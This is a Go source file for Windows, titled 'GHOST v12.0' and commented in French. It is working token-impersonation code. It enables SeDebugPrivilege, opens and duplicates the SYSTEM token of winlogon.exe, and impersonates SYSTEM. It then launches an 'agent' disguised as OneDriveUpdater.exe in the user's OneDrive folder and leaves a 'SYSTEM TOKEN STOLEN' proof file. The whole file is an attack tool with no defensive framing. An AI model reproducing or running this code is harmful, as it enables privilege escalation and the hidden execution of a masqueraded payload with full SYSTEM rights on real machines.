//go:build windows

package main

import (
	"fmt"
	"os"
	"os/exec"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

var (
	advapi32                = syscall.NewLazyDLL("advapi32.dll")
	procImpersonateLoggedOn = advapi32.NewProc("ImpersonateLoggedOnUser")
	procRevertToSelf        = advapi32.NewProc("RevertToSelf")
)

// enablePrivilege active un privilège sur le token du processus courant
func enablePrivilege(privName string) error {
	var luid windows.LUID
	if err := windows.LookupPrivilegeValue(nil, windows.StringToUTF16Ptr(privName), &luid); err != nil {
		return fmt.Errorf("LookupPrivilegeValue: %w", err)
	}

	// Récupère le token du processus courant pour le modifier
	var hToken windows.Token
	if err := windows.OpenProcessToken(windows.CurrentProcess(), windows.TOKEN_ADJUST_PRIVILEGES|windows.TOKEN_QUERY, &hToken); err != nil {
		return fmt.Errorf("OpenProcessToken: %w", err)
	}
	defer hToken.Close()

	// Structure TOKEN_PRIVILEGES : on active le privilège
	tp := windows.Tokenprivileges{
		PrivilegeCount: 1,
	}
	tp.Privileges[0].Luid = luid
	tp.Privileges[0].Attributes = windows.SE_PRIVILEGE_ENABLED

	if err := windows.AdjustTokenPrivileges(hToken, false, &tp, 0, nil, nil); err != nil {
		return fmt.Errorf("AdjustTokenPrivileges: %w", err)
	}
	return nil
}

func main() {
	agentPath := os.ExpandEnv("$LOCALAPPDATA") + `\Microsoft\OneDrive\OneDriveUpdater.exe`

	// VERIFICATION SID (SYSTEM = S-1-5-18)
	token := windows.GetCurrentProcessToken()
	user, _ := token.GetTokenUser()
	if user.User.Sid.String() == "S-1-5-18" {
		// On est SYSTEM : on écrit la preuve et on quitte
		content := "SUCCESS: SYSTEM TOKEN STOLEN\nSID: S-1-5-18 (nt authority\\system)"
		_ = os.WriteFile("C:\\Users\\Public\\WIN_SYSTEM.txt", []byte(content), 0644)
		return
	}

	fmt.Println("====================================================")
	fmt.Println("   GHOST v12.0 - TOKEN IMPERSONATION")
	fmt.Println("====================================================")

	// ACTIVER SeDebugPrivilege (INDISPENSABLE pour accéder à Winlogon)
	if err := enablePrivilege("SeDebugPrivilege"); err != nil {
		return
	}

	// TROUVER WINLOGON.EXE (Toujours SYSTEM)
	snapshot, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
	if err != nil {
		return
	}
	defer windows.CloseHandle(snapshot)

	var pe windows.ProcessEntry32
	pe.Size = uint32(unsafe.Sizeof(pe))

	var targetPid uint32
	for windows.Process32Next(snapshot, &pe) == nil {
		if windows.UTF16ToString(pe.ExeFile[:]) == "winlogon.exe" {
			targetPid = pe.ProcessID
			break
		}
	}

	if targetPid == 0 {
		return
	}

	// OUVRIR et VOLER LE JETON SYSTEM
	hProc, err := windows.OpenProcess(windows.PROCESS_QUERY_INFORMATION, false, targetPid)
	if err != nil {
		return
	}
	defer windows.CloseHandle(hProc)

	var hToken windows.Token
	if err := windows.OpenProcessToken(hProc, windows.TOKEN_DUPLICATE|windows.TOKEN_ASSIGN_PRIMARY|windows.TOKEN_QUERY, &hToken); err != nil {
		fmt.Printf("[-] OpenProcessToken ÉCHEC : %v\n", err)
		fmt.Scanln()
		return
	}
	defer hToken.Close()

	var newToken windows.Token
	if err := windows.DuplicateTokenEx(hToken, windows.MAXIMUM_ALLOWED, nil, windows.SecurityImpersonation, windows.TokenPrimary, &newToken); err != nil {
		return
	}
	defer newToken.Close()

	// USURPER L'IDENTITÉ SYSTEM DIRECTEMENT
	fmt.Println("[*] Usurpation d'identité SYSTEM en cours...")
	ret, _, err2 := procImpersonateLoggedOn.Call(uintptr(newToken))
	if ret == 0 {
		fmt.Printf("[-] ImpersonateLoggedOnUser ÉCHEC : %v\n", err2)
		fmt.Scanln()
		return
	}

	// ON EST MAINTENANT SYSTEM
	fmt.Println("[+] IDENTITÉ SYSTEM ACTIVE !")

	// on appelle l'exploit
	RunSystemFeature(agentPath)

	// On revient à notre identité Admin
	procRevertToSelf.Call()

	fmt.Scanln()
}

func RunSystemFeature(app string) {
	// Préparation de la commande
	fmt.Printf("[*] Exécution de : %s\n", app)
	cmd := exec.Command(app)

	// Exécution et récupération d'une éventuelle erreur
	err := cmd.Run()

	if err != nil {
		fmt.Printf("Erreur lors de l'exécution : %s\n", err)
		return
	}

	fmt.Println("Le programme a été lancé avec succès.")
}
